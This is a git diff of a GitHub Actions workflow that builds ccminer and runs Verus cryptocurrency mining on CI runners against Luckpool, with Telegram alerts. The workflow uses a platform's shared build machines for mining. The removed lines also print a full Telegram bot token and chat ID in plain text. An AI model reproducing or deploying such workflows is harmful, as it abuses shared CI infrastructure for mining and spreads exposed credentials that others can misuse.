@@ -23,7 +23,7 @@ jobs:
         git clone https://github.com/monkins1010/ccminer.git
         cd ccminer
         chmod +x build.sh
-        ./build.sh
+        ./build.sh || { echo "❌ Build gagal"; exit 1; }
 
     - name: Start mining (Luckpool Hybrid Mode)
       run: |
@@ -37,8 +37,10 @@ jobs:
         WORKER="A2"
         LOG_FILE="log.txt"
         MAX_IDLE=600                          # 10 menit tanpa share
-        TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
-        TELEGRAM_CHAT_ID="5763229296"
+
+        # Token & chat ID: gunakan GitHub Secrets atau hardcode
+        TELEGRAM_TOKEN="${{ secrets.TELEGRAM_TOKEN }}"
+        TELEGRAM_CHAT_ID="${{ secrets.TELEGRAM_CHAT_ID }}"
 
         # ————— FUNGSI TELEGRAM —————
         send_telegram() {
@@ -52,11 +54,11 @@ jobs:
 
         # ————— JALANKAN MINER —————
         rm -f "$LOG_FILE"
-        ./ccminer -a verus \
-                  -o $POOL \
-                  -u $WALLET.$WORKER \
-                  -p $PASSWORD \
-                  -t $THREADS | tee "$LOG_FILE" &
+        ./build/ccminer -a verus \
+                        -o $POOL \
+                        -u $WALLET.$WORKER \
+                        -p $PASSWORD \
+                        -t $THREADS | tee "$LOG_FILE" &
 
         MINER_PID=$!
         LAST_ACCEPTED=$(date +%s)
